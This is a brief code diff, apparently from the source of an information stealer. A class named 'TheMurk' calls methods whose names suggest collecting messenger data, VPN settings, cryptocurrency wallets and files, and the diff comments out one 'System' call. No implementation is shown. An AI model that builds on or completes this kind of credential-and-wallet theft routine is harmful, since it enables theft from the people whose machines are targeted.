@@ -19,7 +19,7 @@ class TheMurk:
         self.Messagers()
         self.GetVpn()
         self.Wallets()
-        self.System()
+        # self.System()
         self.GrabFiles()
         self.Conclusion()
         exit(0)
